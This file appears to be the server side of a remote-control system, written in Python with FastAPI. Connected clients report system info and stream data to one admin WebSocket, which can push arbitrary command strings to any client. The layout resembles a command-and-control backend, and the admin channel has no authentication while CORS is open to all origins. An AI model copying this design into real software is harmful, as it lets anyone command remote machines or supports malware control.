from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
import asyncio
import time
import json
import os

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

clients = {}
user_map = {}
last_seen = {}
client_infos = {}
admin_ws = None

@app.get("/clients")
async def list_clients():
    now = time.time()
    result = []
    for client_id in clients:
        status = "Online" if now - last_seen.get(client_id, 0) < 10 else "Offline"
        info = client_infos.get(client_id, {})
        result.append({
            "id": client_id,
            "status": status,
            "info": info
        })
    return {"clients": result}

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    username = client_id.split("-")[0]
    await websocket.accept()

    # Nur einen Client pro User zulassen
    old_id = user_map.get(username)
    if old_id and old_id != client_id:
        old_ws = clients.get(old_id)
        if old_ws:
            await old_ws.close()
        clients.pop(old_id, None)
        last_seen.pop(old_id, None)
        client_infos.pop(old_id, None)

    clients[client_id] = websocket
    user_map[username] = client_id
    last_seen[client_id] = time.time()

    try:
        while True:
            data = await websocket.receive()
            last_seen[client_id] = time.time()
            if "text" in data:
                try:
                    msg = json.loads(data["text"])
                    if msg.get("type") == "client_info":
                        client_infos[client_id] = msg.get("data", {})
                        continue
                except:
                    msg = data["text"]
                if admin_ws:
                    await admin_ws.send_text(f"[{client_id}] {msg}")
            elif "bytes" in data:
                if admin_ws:
                    await admin_ws.send_bytes(data["bytes"])
    except WebSocketDisconnect:
        clients.pop(client_id, None)
        last_seen.pop(client_id, None)
        client_infos.pop(client_id, None)
        if user_map.get(username) == client_id:
            user_map.pop(username, None)

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    global admin_ws
    await websocket.accept()
    admin_ws = websocket
    try:
        while True:
            msg = await websocket.receive_json()
            target = msg.get("target")
            cmd = msg.get("cmd")
            if target in clients:
                await clients[target].send_text(cmd)
    except WebSocketDisconnect:
        admin_ws = None

@app.get("/")
async def serve_index():
    with open("static/index.html") as f:
        html_content = f.read()
    return HTMLResponse(content=html_content, status_code=200)

app.mount("/static", StaticFiles(directory="static"), name="static")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
